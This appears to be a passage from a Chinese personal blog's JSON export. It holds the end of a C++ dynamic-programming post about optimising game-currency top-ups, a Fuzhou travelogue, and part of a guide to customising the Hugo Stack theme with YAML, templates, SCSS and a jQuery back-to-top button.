\u0026#34; yuan to get \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; \u0026#34; points.\\n\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;The method is : \\n\\tcost(￥)\\tpoints\\n\u0026#34;; for (int tmp = i; tmp \u0026gt; 0; ) { int m = lastTopup[tmp]; cout \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; cost[m] \u0026lt;\u0026lt; \u0026#34;\\t\\t\u0026#34; \u0026lt;\u0026lt; gain[m] \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; tmp -= gain[m]; } i += 5; } } void printResultByMaxCost(vector\u0026lt;int\u0026gt;\u0026amp; dp, vector\u0026lt;int\u0026gt;\u0026amp; lastPurchase, int\u0026amp; maxCost); void maxPointsByMaxCost(int maxCost) { int j = 0; vector\u0026lt;int\u0026gt; dp(maxCost + 1, 0); vector\u0026lt;int\u0026gt; lastPurchase(maxCost + 1, 0); for (j = 0; j \u0026lt;= maxCost; j++) { int m = 0; while (cost[m] \u0026lt;= j) { if (dp[j] \u0026lt;= dp[j - cost[m]] + gain[m]) { dp[j] = dp[j - cost[m]] + gain[m]; lastPurchase[j] = m; } m++; } } printResultByMaxCost(dp, lastPurchase, maxCost); return ; } void printResultByMaxCost(vector\u0026lt;int\u0026gt;\u0026amp; dp, vector\u0026lt;int\u0026gt;\u0026amp; lastPurchase, int\u0026amp; maxCost) { cout \u0026lt;\u0026lt; \u0026#34;You can get \u0026#34; \u0026lt;\u0026lt; dp[maxCost] \u0026lt;\u0026lt; \u0026#34; points using \u0026#34; \u0026lt;\u0026lt; maxCost \u0026lt;\u0026lt; \u0026#34; yuan.\\n\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34;The method is: \\n\\tCost(￥)\\tPoints\\n\u0026#34;; for (int tmp = maxCost; tmp \u0026gt; 0; ) { int m = lastPurchase[tmp]; cout \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; cost[m] \u0026lt;\u0026lt; \u0026#34;\\t\u0026#34; \u0026lt;\u0026lt; gain[m] \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; tmp -= cost[m]; } return ; } int main() { minCostToGetTargetPoints(2135); maxPointsByMaxCost(499); maxPointsByMaxCost(200); maxPointsByMaxCost(20); } 我用了LeetCode的 playground 功能，因此这个代码就没有头函数之类了~\n在最后，今年我希望购买鲁班和孙膑的皮肤，可能还需要进阶一下战令！总共需要 1430+710+388 = 2528 点券。我的程序告诉我：\n/* 执行完成，耗时：0 ms Cost 241 yuan to get 2530 points. The method is : cost(￥) points 198 2100 6 60 6 60 6 60 6 60 6 60 6 60 6 60 1 10 Cost 241 yuan to get 2535 points. The method is : cost(￥) points 45 475 45 475 45 475 45 475 45 475 6 60 6 60 1 10 1 10 1 10 1 10 Cost 242 yuan to get 2540 points. The method is : cost(￥) points 198 2100 6 60 6 60 6 60 6 60 6 60 6 60 6 60 1 10 1 10 Cost 242 yuan to get 2545 points. The method is : cost(￥) points 45 475 45 475 45 475 45 475 45 475 6 60 6 60 1 10 1 10 1 10 1 10 1 10 ===== 省略若干行 ===== */ 看来我得花掉 241￥ ，真是一笔大数目 😿\n同时，我的程序还告诉我，241元最多可以获取到：\n/* 执行完成，耗时：0 ms You can get 2535 points using 241 yuan. The method is: Cost(￥) Points 45 475 45 475 45 475 45 475 45 475 6 60 6 60 1 10 1 10 1 10 1 10 You can get 2575 points using 243 yuan. The method is: Cost(￥) Points 198 2100 45 475 */ 诶？多花2块钱，即243元，能够多获取 40 点券？\n我先去充钱了朋友们~\n","date":"2022-01-31T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E7%8E%8B%E8%80%85%E8%8D%A3%E8%80%80%E8%99%8E%E5%B9%B4%E5%85%85%E5%80%BC%E7%AE%80%E5%8D%95dp%E9%97%AE%E9%A2%98/","title":"王者荣耀虎年充值——简单DP问题"},{"content":"游福州两天而回，感想不多，然而不可不写。我一向觉得，游而不记，则一路所得的独特而美妙的体验总是要随着时间流逝而淡去，未免可惜。\n首日 1月17日，同李泓踏上前往福州的动车。\n这似乎是我首次乘坐动车出门旅行（漳州到厦门的十几分钟自然是不计在内的）。在福建省内，窗外最多的应该是丘陵和村庄，间以城市和工厂，景致并不足以令人沉醉其中。我在车上看起了毛选，始觉得我的乘车修为已经与往日有天壤之别。我还是应该将这一变化归功给暑假期间每日两小时的班车，其时所受的劳累与颠簸不愿回想，有感一切从脆弱到坚强都是经过了不知多少痛苦而无奈的修炼啊。\n到达福州站还不到两点，我们直接进入地铁，前往新华社福建分社。从地铁出来的时候，我开始头一次观察这个城市了。福州的街道是整洁的，街边的一长排商铺恍然是石码的增强版本；街道两边的楼房并不高大，因此并不给人以威压；此处楼房之高度适中、街道之繁华有度、商铺之忙碌温馨，很难令人产生疏离之感，只觉得自己的家乡与此并无不同，或者自己的家乡未来正该如此。\n真正的巨城，如北京，它的某些地方会使人感到非常陌生，那些地方有极大的人流，有万般的光影，有铺面而来的宏大建筑，综合来说，就是有一种令人时刻不能停歇的空气，分明在告诉外地来的人：此处无立足之地。而这样的地方，总是在巨城给人带来的文化的、资源的吸引上，重新引入一番理智，也重新带给生活于巨城中的外地来者一种漂泊无依的凄苦感受。\n上次在外地见到这样的温馨的、如同家乡一般的场面，已不知是什么时候。此前在杭州是产生过类似的熟悉感的，但那是对于较旧的、老街道的熟悉感，而福州新华社附近，那是较新的、正在发展中的熟悉感。\n李泓在新华社办完了事情之后，我们乘坐地铁到达两天的落脚之地——如家酒店（达明美食街店）。\n不管在什么时候，初次进入到酒店房间的那种快乐总是存在的。这是一种来到了他乡之后、找到一块落脚点的喜悦，也是一种旅途劳累之后、终于可以洗去风尘的喜悦；加之我们两人都背着沉重的背包，进入房间之后得以彻底解脱，何其欢快也！\n在酒店内歇息时，靠在床上看新闻是我最大的爱好。我喜欢电视上传来一本正经的播音腔，不管其内容如何（多数情况下是很积极的），而我将我的一切负担都卸到床上，这样的环境令我感到最大地放松。\n傍晚，我们已经无力出门用餐，点了“醉得意”的外卖。其中醉排骨和荔枝肉是两道声名在外的福州菜，我觉得醉排骨是很香的，排骨的肥肉已经被炸的酥脆，没有油腻之感；荔枝肉则很一般，有点类似锅包肉，且过于甜，加之肉的肥，不大爽口。\n餐后继续小歇一阵，我们决定出门前往西湖公园。这次旅行的行程是紧张的，而不可不去的景点有三个，我想，宁可让身体稍微劳累一些，也不能在这里留下遗憾的。\n夜晚的福州更加美丽。车水马龙自不必说，街边的榕树和同样饭后散步的行人，是这座城市繁忙节奏的很好的中和剂。我在北京看到的是纯粹的忙碌，在杭州看到的是忙碌与寂静的结合，唯有福州是忙碌与悠闲的结合。我必须说的是，一切的所见都是片面的，因而一切的对比都是主观的，但同样一切的好恶也都是主观的，我在饭后散步的区区几千步内，深刻地为福州的生活气息所吸引了。\n西湖公园是一片小水域，作为园林，比不上杭州的西湖，也比不上北京的北海公园或什刹海，以其有一个缺陷——风雅之地不多。西湖自不必说，几千年来的迁客骚人会聚之地；皇家园林也不必说，每一个地方都是有内涵的，在地图上光是看到某一处的名字，你便觉得它不可不去；我进行这样的比较，不是希望彻底否定福州的西湖公园，只是记录下我认为的不足，自然，它还有极好的、独特的一面，我也是要说的。\n西湖公园的独特，也来自于它的风雅之地不多。因其不具备大园林那样丰富的景点，它成为了一个免费的、环境甚佳的人民公园。公园周边的道路有很多摊贩，公园内到处可见散步、跳舞、带孩子的人群，这样纯粹的公园身份，是不存在于杭州西湖这样的地方的。矛盾就是这样子转化，西湖公园作为园林景区的缺点，在这里转化为它作为人民公园的独特的优点了。\n一趟逛下来有将近四公里，再回到宾馆，重温下午的那种放松与喜悦，在疲惫包围下坠入梦乡。\n次日 隔天醒来，腿脚仿佛已经不受控制，然而这是一次不可多得的旅行，在我们的计划中三坊七巷是不可不去的。\n我们的住地离三坊七巷近得很，走几分钟便到了“南后街”石牌楼，在牌楼右侧是林觉民和冰心的故居，此日的行程便从故居开始。\n闽地的建筑风格大抵是相像的，一进门是一片很大的堂厅，大厅右侧的房间陈列着介绍林觉民的一些资料，再往后走能够见到林觉民的寝室。寝室面积不大，光线也不怎么好，摆着一张不长的床，床不远处是一张小桌。我此前见过较多的是北方的皇家寝室，因此陡然见到这样平民的格局，感到有些许凄凉。然而，就是在这样的小屋子里，住着一腔热血的、渴望解放人民的志士，在千里外的京城的雅致的大屋子内，住的人却是那封建的、剥削阶级的代表；自古最革命的那批人，总是以不那么好的条件开局，成就了事业之后，若不带动着所有的人民一同向好处去走，则这样的小屋子总还有人住进去、这样的时局总还有人去改变的。\n冰心的屋子跟林觉民的屋子似乎不通，我没有摸清具体的格局。她的屋子连着个小院，小院不大，但很亮堂，住在这里想来心情会是很好的。\n走出两位先辈的故居，我们才正式进入了三坊七巷。\n此行较仓促，事前的期待也并不很高，因此没有做充足的功课。尽管准备不足，三坊七巷的古风古韵还是给我们留下了很深的印象。南后街是三坊七巷的中轴，从石牌楼进入南后街，左边可以入巷，右边可以入坊，道路两旁是各种各样的店面。我们依次游了郎官巷、塔巷、黄巷、衣锦坊、安民巷、文儒坊、官巷，因光禄坊和吉庇巷现已改为街道，我们只沿吉庇巷往回走去，并未再去光禄坊。\n从总的来说，坊巷的格局是很吸引人的。走在石板砖上，眼前所见是蜿蜒的、因而望不见终点的巷道，两边是闽式的古老的楼房，似乎历史之风从巷内扑面吹来，从这里出出入入过多少的文人、显贵，又激荡回响着多少改变中国的宏愿和豪言啊！且不论对历史的虚无的遐想，单是眼前所保存的建筑，它们的雕刻得无比精美的梁柱和设计得相当巧妙的布局，就已经足够震撼、足够令人陶醉其中了。中国文化之厚重底蕴总是在这种细微之处体现出来，如今却再难见到这样的精细的建筑工艺，从上层建筑来说应该是浮躁的快节奏环境对古老的匠心的一种侵蚀，从经济基础上则是生产关系和资本市场已经不容许广泛考究的雕琢了。\n在游览的过程中，我们来到永和鱼丸店，打算尝试一下这项久负盛名的小吃。我个人是失望的，鱼丸的汤有一种淡淡的臭味（对我来说），仿佛是制作咸鱼的过程中散发的那种味道，令人不大愉快；鱼丸本身没有太多的缺点，但无论口感和味道都只是中规中矩；我不能否定这项食物，只能否定永和鱼丸，假如下次还有机会来福州，其他地方的鱼丸仍是值得一试的。\n结束了三坊七巷的游览，时间只到中午。我们决定把原计划第三天才去的上下杭挪到第二天完成，并将原计划第三天晚上的车票改签到第三天下午，以避免第三天背着沉重的负担游览而造成过多的劳累。\n从东街口地铁站乘坐地铁至达道站，在地铁附近品尝了福州的捞化——其实就是家乡的面线。我认为捞化这种食物的上限是很高的，因为有很多的食材可以与之同煮，不过我们吃到的是清汤捞化，唯一的佐菜是一叠卤肉，只能庆幸店家的汤做得还算爽口，如果跟鱼丸的汤一样，恐怕真要令我欲哭无泪了。\n饭后步行几分钟即可来到上下杭历史风貌区，这里是一片类似三坊七巷的古建筑区，被两条主要道路——上杭路和下杭路——分为了三块区域，我们决定从上杭路进入，从下杭路离开。\n漫步在上下杭内，我感到福州这座城市的底蕴还是浓厚的。仍旧是蜿蜒的街道，没有巷内那种开阔活泼的气息，更接近坊的那种端庄威严。道路有宽窄的变动，这是上下杭不同于三坊七巷的一点，在最窄的地方仅容一人通过，最宽的地方又分明是一处小的合院。应该说，上下杭是将我见过的闽南乡村那种街道布局同福州坊巷的建筑融合在一起，且这些建筑都是建造水平很高的、保存较好的建筑，因此从空间和视觉上带给人的体验就是既温馨又庄重，既古老又亲切。\n在上杭路和下杭路交会的地方，我们看到的是岁康参号的旧址，这是一个西洋参专卖铺，建筑并不高大，但外立面的配色和石材的雕刻都做得细致完美。在这里遇到一位福州老伯，他向我们指出参号角落的一颗悬空而生的榕树，悬空而生！老伯说，这榕树依附在建筑上，生命力还非常旺盛，足见屋主人对这颗树的喜爱和照料，这也是福州的一处特色。我要感谢这位亲切的老伯，他让我对“榕城”的“榕”字体会更深了一步。\n悬空而生的榕 下杭路比上杭路更加开阔，有点像南后街，道路两旁是一些店面。老建筑能够在现世发光发热，这是一件令人高兴的事；没能进入到这里的餐馆用用餐，可以算作一点小遗憾。\n下杭路还连通着一片小天地。从一条垂直于上下杭路的小道出去，能够到张真君祠，香火蛮旺盛。张真君祠临着一条河流，河流与下杭路是平行的；如果说上下杭是古建的街区，则张真君祠这一侧是一片小的水乡；事实上，这里的格局跟闽南的村落是相似的，临水处总是宗教或宗族的场所，而往内才是通达的巷道和房屋的群落。\n小逛了一圈，仍从下杭路离开这片街区。回到车流繁忙的主路上，适才的游览恍然如梦；这样的地方真令人陶醉，拥有这样地方的福州是可爱的、吸引人的。\n回到宾馆，还是那熟悉的从心里升起的轻松之感，我们休息到了晚上。\n吃完汉堡王的外卖之后，我们出门去逛达明美食街。这样的先吃后逛美食街的安排可以说是此行最离谱的行为——纵然美食街有琳琅满目的食物，我们已经吃不下什么东西了！不过，最有烟火气的地方，总是与食物有关，达明美食街的纯粹的烟火气，可以说是为本次旅行画下了一个很好的句点。\n尾日 最后一天，已经没有任何的安排。还是靠在宾馆的床上，耳听着新闻的播报，回味着三天的行程。我想，旅行并不是一种身心上的放松，而简直是一种身心上的拉练。凡是要考虑时间和经济成本的旅行，是根本不能放松的，要在不那么舒适的旅舍内休憩、在有限的时间内不留遗憾地逛完好几处景点，叫做什么放松呢？我情愿把这种“放松”叫做是一种“转移”，它是将平日里柴米油盐的、学习工作的劳累，转移到四处游走的劳累上了。这样的转移，从全局上来说不是放松，因为根本没有放松，乃至于更加疲惫了，但从局部上来说，是很大的放松，是生活中主要矛盾的一种转化，当我们从四处游走回到按部就班的坐定与学习，仿佛是做过了一场五光十色的大梦，原本已经深感枯燥的生活节奏又变得亲切与活泼起来。\n基于学生的生活来说，我是不大喜欢旅行的，因为大学生是最舒适、自由的群体，平日里面临的苦恼并不那么多；但将来进入工作，就说不准我对旅行的态度；我想，随着工作的压力源源不绝地来，与好友出门旅行这样的矛盾的转化办法，应该是有必要经常使用的，不过不能一次性地那么累就是了。\n","date":"2022-01-20T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E7%A6%8F%E5%B7%9E%E6%B8%B8%E8%AE%B0/","title":"福州游记"},{"content":"近期一好友搭建博客，使用了跟我一样的 Hugo Stack主题 ，在自定义的过程当中痛不欲生。我才发现JimmyCai大佬已经把这个主题更新了好几版，无怪乎我旧有的一些经验已经不起作用了。\n今天下载了 3.6.0 版本的 Release ，打算这几天把作者更新出来的一些好东西和我之前自己修改的一些东西结合一下，两者都有所扬弃，总的来说就是希望把我这个自娱自乐的博客弄得再好看一些。\n动工前纪念 动工之前，把旧有的博客样式和 未作修改之前的 新版Stack样式进行一下合影留念，也算是这个博客样貌成长的一个里程碑吧。其实我想最终的样子跟现有的样子相比，不会有很大的变化，但应该能够把我此前很不爽且无能为力的一些细节消灭掉，后文细说~\n旧主页 新Stack主页（未修改) 旧文章页面 新Stack文章页面（未修改) Part 1 左边栏 图标 图标显示 修改配置文件和 page\n首先，可以看到新版的主题左边栏的几个跳转按钮（后文使用 menu 来指代这几个东西）是没有图标的，光秃秃的很不好看。\n左边栏 发生这种情况的原因是新版的 menu 图标与旧版的图标不同。在旧版主题中， menu 图标由 menu.main.pre 来指定，而新版的图标由 menu.main.params.icon 来指定，参数都不一样了，图标丢失是当然的了！\n根据作者的 文档 ，添加页面有两种方式，一种是在 content/page 页面的 Front Matter 中加上 menu.main 参数，另一种是在 config.yaml 文件中添加 menu.main 参数。旧有的主题也是这么工作的， 我们只需要把跟图标相关的参数修改一下就行了 。\n以 config.yaml 中的内容为例，以前的 menu 是这样的：\nmenu: main: - identifier: home name: 博文 url: / weight: -100 pre: home 修改过后，要变成这样：\nmenu: main: - identifier: home name: 主页 url: / weight: -100 params: icon: home 在 page 当中的那些页面也要如此修改。\n于是我们的图标就回来了！\n调出图标 图标高亮 如果当前页面对应左边栏的某个入口，那么左边栏的图标应该高亮显示。\n主页图标高亮 主页图标不高亮（新版) 新版的主题只有一点小问题，那就是主页的图标没办法高亮。\n在 layouts/partials/sidebar/left.html 中找到了图标高亮的相关代码，从第 56 行开始：\n\u0026lt;ol class=\u0026#34;menu\u0026#34; id=\u0026#34;main-menu\u0026#34;\u0026gt; {{ $currentPage := . }} {{ range .Site.Menus.main }} {{ $active := or (eq $currentPage.Title .Name) (or ($currentPage.HasMenuCurrent \u0026#34;main\u0026#34; .) ($currentPage.IsMenuCurrent \u0026#34;main\u0026#34; .)) }} \u0026lt;li {{ if $active }} class=\u0026#39;current\u0026#39; {{ end }}\u0026gt; \u0026lt;a href=\u0026#39;{{ .URL | relLangURL }}\u0026#39; {{ if eq .Params.newTab true }}target=\u0026#34;_blank\u0026#34;{{ end }}\u0026gt; {{ $icon := default .Pre .Params.Icon }} {{ if .Pre }} {{ warnf \u0026#34;Menu item [%s] is using [pre] field to set icon, please use [params.icon] instead.\\nMore information: https://docs.stack.jimmycai.com/configuration/custom-menu.html\u0026#34; .URL }} {{ end }} {{ with $icon }} {{ partial \u0026#34;helper/icon\u0026#34; . }} {{ end }} \u0026lt;span\u0026gt;{{- .Name -}}\u0026lt;/span\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; 注意代码片段中的第四行，即控制 active 这个属性的部分，当 active 为 true 时，左边栏的对应图标就高亮了。\n什么情况下 active 会是 true 呢？作者在这边写的语句比较复杂，其实只有两种情况：\n当前页面的 标题 和某个 menu.name 相同； 当前页面可以在 Menus 菜单中找到，即当前页面属于从 menu 菜单可以访问的页面。 在本地测试中，无论从 config 文件添加主页入口，还是从 page 目录下添加主页入口，主页都是 不高亮 的。看来在Hugo中主页不属于 menu 菜单的一部分。\nactive 的原理基本上弄清，理论上可以将主页入口也设置成高亮；但是时间有限且难以找到一个合适的逻辑，因此暂时不考虑这个细节。\n2022-01-15更新\n我们重新梳理一下上面的代码逻辑：对于任意一个页面，首先获取页面对象本身，然后对全站的所有 Menus 进行遍历，记当前遍历到的菜单对象为 menu ，如果当前菜单符合某种条件，就将其高亮。\n当：\n当前页面的 标题 和 menu.name 相同的时候； 当前页面属于 menu 菜单下的页面； 两个条件任意一个成立，我们遍历到的 menu 组件就产生高亮。\n正常情况下，高亮是由第一个条件产生的，即某个页面的标题与 menu.name 相同。例如，点击【归档】这个按钮，跳转到 归档 这个页面，在这个页面加载的时候，第一个条件触发，对应的名称为“归档”的那一个 menu 就显示为高亮。\n而在主页下，主页的标题是网站的标题，主页的 menu.name 却是“主页”，因而第一个条件无法成立；在更早的分析中，我认为由于Hugo API的原因，使得 / 目录不被认为是某个 menu 能够达到的页面，所以在这里第二个条件也没有成立，主页的图标就不显示高亮了。\n希望让主页图标高亮，光靠作者的这两个逻辑是不够的，应该为 $active 变量补充一些逻辑。\n在主页，页面标题是站点标题即 XR_S's Blog ，而 menu.name 是 主页 ，因而第一个条件不成立；在更早的分析中， 我认为由于hugo API的问题使得第二个条件对于 / 路径也不成立，因此主页的入口没有显示高亮。\n那么我们应该添加什么逻辑呢？\n首先我们知道主页的 menu 是添加在 config 文件中的，它的配置是：\nmenu: main: - identifier: home name: 主页 url: / weight: -100 params: icon: home 这里有它的独一无二的属性就是 identifier ，利用这个属性，我们可以获取到代表主页的这一个 menu 入口。\n我选用的逻辑是： 假如当前的页面标题与网站标题相同，我就将主页的 menu 入口设置为高亮 。\n因此修改 $active 部分的相关代码为：\n{{ $currentPage := . }} {{ $siteTitle := .Site.Title }} {{ range .Site.Menus.main }} {{ $active := or (eq $currentPage.Title .Name) (or ($currentPage.HasMenuCurrent \u0026#34;main\u0026#34; .) ($currentPage.IsMenuCurrent \u0026#34;main\u0026#34; .)) }} {{ $active := or ($active) (and (eq $currentPage.Title $siteTitle ) (eq .Identifier \u0026#34;home\u0026#34;)) }} 成功让主页菜单高亮了！\n主页布局 主页的布局可以说是整个新主题当中最令人不满意的地方。\n我没有美学基础，只从最基本的个人的视觉喜好出发，首先对比一下新旧两个主题主页布局的差异。\n旧主题 新主题 我的感受是：旧主题的页面左右端有一定的留白，显得比较和谐；新主题的页面左右端距离浏览器边框非常近，过于拥挤了。\n决定将旧主题的主页布局迁移到新主题上，同时进行一些微调。\n修改自适应布局 要修改主页的布局，首先应该找到控制主页样式的那个文件。它的路径是在 [themePath]/assets/scss/grid.scss ，不过我希望读者能明白我是怎么找到它的。\n正如我在 这篇记录 当中所说，精确调整样式，你应该使用开发者工具选中你的目标，然后看到它的 class ，之后在项目的所有CSS文件中找到这个 class 对应的选择器，就能看到作者为它赋予了哪些样式。\n例如我们要修改主页的布局，那就要用开发者工具选中主页，可以根据直觉来判断你选的对不对，一般来说一个页面会分成好几个模块，就像我们的主页那样：\n选中主页 我们知道这三个模块构成了主页，它的 class 是 container ；直接到CSS文件目录中查找，发现 container 这个类的样式是在 grid.scss 这个文件中定义。\n开始阅读这个文件，在很靠前的地方就发现了它的重要内容哈！\n.container { margin-left: auto; margin-right: auto; .left-sidebar { max-width: var(--left-sidebar-max-width); margin-right: 1%; } .right-sidebar { max-width: var(--right-sidebar-max-width); /// Display right sidebar when min-width: lg @include respond(lg) { display: block; } } \u0026amp;.extended { @include respond(md) { max-width: 1024px; --left-sidebar-max-width: 25%; --right-sidebar-max-width: 30%; } @include respond(lg) { max-width: 1280px; --left-sidebar-max-width: 20%; --right-sidebar-max-width: 30%; } @include respond(xl) { max-width: 1536px; --left-sidebar-max-width: 15%; --right-sidebar-max-width: 25%; } } === snip === } 我们看到，作者在这个文件中限制了 container 的子元素 left-sidebar 和 right-sidebar 的最大宽度，分别用 --left-sidebar-max-width 和 --right-sidebar-max-width 来表示最大宽度的限制，然后动态调整这两个变量的值，来实现对不同设备屏幕的适应。\n在Stack新主题的各个CSS文件中，经常要看到 @include respond() 这种写法，它是什么东西呢？\n我们找到了 asset/scss/breakpoints.scss 这个文件，它的内容是这样的：\n$breakpoints: ( sm: 640px, md: 768px, lg: 1024px, xl: 1280px, 2xl: 1536px, ); @mixin respond($breakpoint) { @if not map-has-key($breakpoints, $breakpoint) { @warn \u0026#34;\u0026#39;#{$breakpoint}\u0026#39; is not a valid breakpoint\u0026#34;; } @else { @media (min-width: map-get($breakpoints, $breakpoint)) { @content; } } } 啊哈，原来 respond 函数就是个CSS中的 @media 关键字的封装嘛。\n例如在上面的样式中，我们看到 @include respond(md) 这样的用法，翻译翻译就是 @media(min-width: 768px) 而已！表示这个样式要在屏幕宽度 768px 以上才能生效！\n看到这里，这些自适应的布局就没那么吓人了，就是 在不同的设备上指定不同的左右侧边栏宽度 而已。\n我使用的笔记本电脑屏幕宽度是在 1024px 以上的，也就是说我只要修改 @include respond(lg) 底下的样式就行了。\n在 asset/scss/custom.scss 文件中添加如下的代码：\n.container { margin-left: auto; margin-right: auto; \u0026amp;.extended { /* range: 768-1024 */ @include respond(md) { max-width: 1024px; --left-sidebar-max-width: 25%; --right-sidebar-max-width: 30%; } /* range: 1024-1280 */ @include respond(lg) { max-width: 1280px; --left-sidebar-max-width: 25%; --right-sidebar-max-width: 22%; } } \u0026amp;.compact { @include respond(md) { --left-sidebar-max-width: 25%; max-width: 768px; } @include respond(lg) { max-width: 1024px; --left-sidebar-max-width: 20%; } @include respond(xl) { max-width: 1280px; } } } 其中在我的电脑上真正起到作用的只有 @include respond(lg) 部分而已！我把左侧边栏的宽度放宽到 25% ，右侧边栏宽度放到 22% ，是我个人比较舒服的数字。\n修改非自适应布局 经过上面的修改，现在的主页应该是这样的：\n主页（未完成） 主要有几个问题：\n中间栏显得过于宽；\n左边栏头像太抢戏。\n我们针对 left-sidebar 和 right-sidebar 再进行一下微调，在 custom.scss 中继续追加：\n.left-sidebar { --sidebar-avatar-size: 120px; --sidebar-element-separation: 20px; margin-right: 1%; padding: var(--main-top-padding) 15px; max-height: 100vh; padding-right: 25px; } .right-sidebar { margin-left: 25px; } 这部分内容是经过旧参数的试验，发现的视觉上比较舒服的参数，而这些东西不用随着屏幕变化而变化，因此不写在刚才的自适应布局中，直接放在最外层。\n至此，我的主页就调整完毕了。 custom.scss 文件全部内容如下：\n.container { margin-left: auto; margin-right: auto; \u0026amp;.extended { /* min-width: 812 @media (min-width: $on-phone) { max-width: 800px; --left-sidebar-max-width: 25%; } */ /* range: 768-1024 */ @include respond(md) { max-width: 1024px; --left-sidebar-max-width: 25%; --right-sidebar-max-width: 30%; } /* range: 1024-1280 */ @include respond(lg) { max-width: 1280px; --left-sidebar-max-width: 25%; --right-sidebar-max-width: 22%; } } \u0026amp;.compact { @include respond(md) { --left-sidebar-max-width: 25%; max-width: 768px; } @include respond(lg) { max-width: 1024px; --left-sidebar-max-width: 20%; } @include respond(xl) { max-width: 1280px; } } } /* 跟上面 container 中的 left-sidebar 没有区别 但是这部分内容不需要使用 respond 函数，因此直接放在最外层固定下来即可 */ .left-sidebar { --sidebar-avatar-size: 120px; --sidebar-element-separation: 20px; margin-right: 1%; padding: var(--main-top-padding) 15px; max-height: 100vh; padding-right: 25px; } .right-sidebar { margin-left: 25px; } 在修改中，我没有完全复刻旧主题，因为我在修改过程中发现了现有布局的一些优点，放到下一小节分析。\n主页视觉分析 旧主页 新主页 我想指出旧主页的一个问题，这些问题在现在这个主页中是不存在了。\n旧主页 可以看到，旧主页中左边栏和文章列表的间距是比较大的，而文章列表和右边栏则贴得很紧，三个模块产生了一点割裂的感觉。\n新主页 而在新主页中，四块留白区域宽度基本相同，左侧边栏占用的空间出让给了文章列表，突出了重点，整体上给我的感觉是比较和谐的。\nPart 2 文章页面 新主题文章页面 这个文章页面是我决定更新新主题的一个重要原因。旧主题是没有右边的 目录 一栏的，我曾经仿照新主题的样式自行实现了一下，但是效果并不是特别理想：\n旧主题文章页面 直接更新主题之后，解决了文章样式的痛点，还是比较舒服的。考虑到这是一次大升级，我想顺便把之前的一些不足的细节补充上。\n返回顶部按钮 添加函数 在阅读比较长的文章时，有一个东西是我认为非常必要的，那就是返回顶部按钮。\n在新主题中，作者已经写好了Table Of Conents（即文章目录），且它的位置就在页面右侧。我希望直接在该组件的下方添加一个返回顶部的按钮，当页面不处于顶部时，该按钮出现，点击之后返回页面的顶部。\n按钮的核心函数直接参考了 Slim主题 ，具体做法是在 layouts/partials/head/script.html 中添加如下的代码：\n\u0026lt;script src=\u0026#34;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; // Check to see if the window is top if not then display button $(window).scroll(function() { if ($(this).scrollTop()) { $(\u0026#39;#back-to-top\u0026#39;).fadeIn(); } else { $(\u0026#39;#back-to-top\u0026#39;).fadeOut(); } }); // Click event to scroll to top $(\u0026#39;#back-to-top\u0026#39;).click(function() { $(\u0026#39;html, body\u0026#39;).animate({scrollTop: 0}, 1000); return false; }); \u0026lt;/script\u0026gt; 函数使用了 jQuery 监听窗口的滚动，并控制按钮的出现与消失，其核心是一个具备 back-to-top ID的HTML元素，在原本的主题（Slim主题）中，这个元素就是一个简单的 \u0026lt;a\u0026gt; 标签。\n我希望自定义返回顶部按钮的外观，并决定使用一张图片来代替Slim主题中朴素的 ^ 号。\n添加组件 此前已经提过，我希望这个按钮就放置在文章目录下方，那么我们就要找到文章目录的HTML代码，然后在它下方插入这个按钮的代码。\n找到 layouts/_default/single.html ，在它的第 47 行找到了TOC的代码，在 aside 内部、TOC底部插入下面的代码：\n{{ $topImg := resources.Get (\u0026#34;img/top.png\u0026#34;) }} {{ $topImg := $topImg.Resize \u0026#34;40x\u0026#34; }} \u0026lt;a id=\u0026#34;back-to-top\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;{{ $topImg.RelPermalink }}\u0026#34; /\u0026gt; \u0026lt;/a\u0026gt; 这段代码是我仿照 Avatar 部分的代码写出来的，作者用类似的代码实现了主页左边栏的头像。需要把代码的图片跟头像的图片放在一起，也就是放在 [网站根目录]/assets/img 文件中。\n那么，TOC部分的代码就变成了这样子：\n{{ define \u0026#34;right-sidebar\u0026#34; }} {{ if (.Scratch.Get \u0026#34;hasTOC\u0026#34;) }} \u0026lt;aside class=\u0026#34;sidebar right-sidebar sticky\u0026#34;\u0026gt; \u0026lt;section class=\u0026#34;widget archives\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;widget-icon\u0026#34;\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;hash\u0026#34; }} \u0026lt;/div\u0026gt; \u0026lt;h2 class=\u0026#34;widget-title section-title\u0026#34;\u0026gt;{{ T \u0026#34;article.tableOfContents\u0026#34; }}\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;widget--toc\u0026#34;\u0026gt; {{ .TableOfContents }} \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; {{ $topImg := resources.Get (\u0026#34;img/top.png\u0026#34;) }} {{ $topImg := $topImg.Resize \u0026#34;40x\u0026#34; }} \u0026lt;a id=\u0026#34;back-to-top\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;{{ $topImg.RelPermalink }}\u0026#34; /\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/aside\u0026gt; {{ end }} {{ end }} 添加样式 最后一步是很简单的，我们还是需要为这个组件添加CSS样式。\n找到熟悉的 custom.scss 文件，追加下面的代码：\n$hover: 0.2s ease-in-out; #back-to-top { bottom: -30px; right: 2px; display: none; position: absolute; border: 0; transition: transform $hover; \u0026amp;:hover { transform: translateY(-10px); } } 这里只需要注意两个重点（也就是我在添加这个组件过程中踩坑的点）：\nposition: absolute ，能够将按钮固定，且它的父元素是我们上面看到的 \u0026lt;aside\u0026gt; 标签，就能将按钮跟TOC的相对位置固定起来（因为他们同属于一个父元素）；如果使用 position: fixed 就不能起到这个效果，因为 fixed 